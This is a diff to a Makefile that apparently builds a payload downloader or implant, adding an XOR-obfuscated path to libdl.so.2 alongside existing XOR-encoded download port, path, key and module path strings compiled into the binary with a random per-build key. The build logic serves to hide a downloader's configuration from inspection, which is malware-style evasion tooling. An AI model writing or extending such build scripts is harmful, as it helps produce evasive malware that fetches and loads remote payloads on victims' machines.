@@ -19,6 +19,7 @@ DOWNLOAD_PATH ?= /payload
 DOWNLOAD_KEY ?= secret
 LISTENER_TYPE ?= HTTP
 MODULE_PATH ?= 
+DOWNLOADER_MODULE_PATH ?= /lib/x86_64-linux-gnu/libdl.so.2
 
 # Generate random XOR key per build
 XOR_KEY_VALUE := $(shell python3 -c "import random; print(hex(random.randint(1, 255)))")
@@ -29,6 +30,7 @@ XOR_PORT := $(shell python3 -c "s='$(DOWNLOAD_PORT)'; k=$(XOR_KEY_VALUE); print(
 XOR_PATH := $(shell python3 -c "s='$(DOWNLOAD_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
 XOR_KEY := $(shell python3 -c "s='$(DOWNLOAD_KEY)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
 XOR_MODULE_PATH := $(shell python3 -c "s='$(MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
+XOR_LIB_PATH := $(shell python3 -c "s='$(DOWNLOADER_MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
 
 # Define listener type
 CFLAGS += -DLISTENER_$(LISTENER_TYPE)
@@ -39,6 +41,7 @@ CFLAGS += -DENCODED_PORT="$(XOR_PORT)"
 CFLAGS += -DENCODED_PATH="$(XOR_PATH)"
 CFLAGS += -DENCODED_KEY="$(XOR_KEY)"
 CFLAGS += -DENCODED_MODULE_PATH="$(XOR_MODULE_PATH)"
+CFLAGS += -DENCODED_LIB_PATH="$(XOR_LIB_PATH)"
 CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
 
 DL_SRCS = downloader.c net_utils.c aes.c tinflate.c utils.c
